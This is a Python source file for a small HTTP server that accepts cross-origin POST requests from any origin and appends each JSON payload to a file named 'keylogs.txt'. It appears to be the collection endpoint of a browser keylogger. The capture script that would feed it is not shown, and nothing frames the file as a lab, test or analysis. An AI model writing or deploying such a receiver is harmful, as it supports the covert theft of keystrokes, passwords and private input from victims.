from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import json

class RequestHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        """Handle CORS preflight requests."""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])  
        post_data = self.rfile.read(content_length).decode('utf-8')  
        data = json.loads(post_data)
        logging.info(f"Received: {data}")
        

        
        with open("keylogs.txt", "a") as log_file:
            log_file.write(json.dumps(data) + "\n")

        self.send_response(200)
        self.end_headers()

def run(server_class=HTTPServer, handler_class=RequestHandler, port=8080):
    logging.basicConfig(filename="keylogs.txt", level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Starting server on port {port}...\n")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
